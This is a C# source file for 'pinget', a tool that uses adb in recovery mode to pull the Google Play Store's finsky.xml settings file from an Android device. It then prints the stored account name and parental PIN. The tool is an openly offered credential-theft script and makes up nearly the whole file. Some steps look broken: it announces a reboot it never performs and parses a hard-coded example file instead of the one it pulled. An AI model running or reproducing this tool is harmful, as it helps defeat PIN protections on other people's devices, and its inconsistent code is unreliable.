using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Text.RegularExpressions;

namespace pinget_windows
{
    class Program
    {
        private static void sendCMD(string arg)
        {
            System.Diagnostics.Process proc = new System.Diagnostics.Process();

            proc.EnableRaisingEvents = false;
            proc.StartInfo.FileName = "./files/adb.exe";
            proc.StartInfo.Arguments = arg + " 2> nul";
            proc.StartInfo.RedirectStandardOutput = true;
            proc.StartInfo.UseShellExecute = false;
            proc.StartInfo.CreateNoWindow = true;
            proc.Start();
            proc.WaitForExit();

        }
        static void Main(string[] args)
        {
            //Window Title
            Console.Title = ("pinget - Google Play Store PIN Extractor for Windows by cyr0s/compl3x (@Complex360)");
            //Header
            Console.WriteLine("---------------------------------------------------");
            Console.WriteLine("pinget - Google Play Store pin theft vulnerability");
            Console.WriteLine("---------------------------------------------------");
            Console.WriteLine("Made by cyr0s/compl3x (@Complex360)");
            Console.WriteLine("Thanks to zanderman112 && trter10");
            Console.WriteLine("---------------------------------------------------");

            //Restart adb so Xenu doesn't get mad
            Console.WriteLine("Restarting adb");
            sendCMD("kill-server");
            sendCMD("start-server");

            //Booting into recovery so /data/ can be read from without issues
            Console.WriteLine("Rebooting into recovery...");
            Console.WriteLine("Once recovery has loaded, select \"mounts and storage\" then \"mount /data/\" then press [ENTER]");
            Console.ReadLine();
            Console.WriteLine("Pulling finsky.xml");
            sendCMD("pull /data/data/com.android.vending/shared_prefs/finsky.xml");

            //Stupid intricate splitting - Because f*ck System.Xml
            Console.WriteLine("Parsing account and pin code...");
            string xml = File.ReadAllText("example_finsky.xml");
            string[] acc = Regex.Split(xml, "account\">");
            string[] acc2 = Regex.Split(acc[1], "</string>");

            string[] pin = Regex.Split(xml, "pin_code\">");
            string[] pin2 = Regex.Split(pin[1], "</string>");

            //Print Account and PIN code
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("Account: " + acc2[0]);
            Console.WriteLine("PIN Code: " + pin2[0]);
            Console.ReadLine();
        }
        }
    }
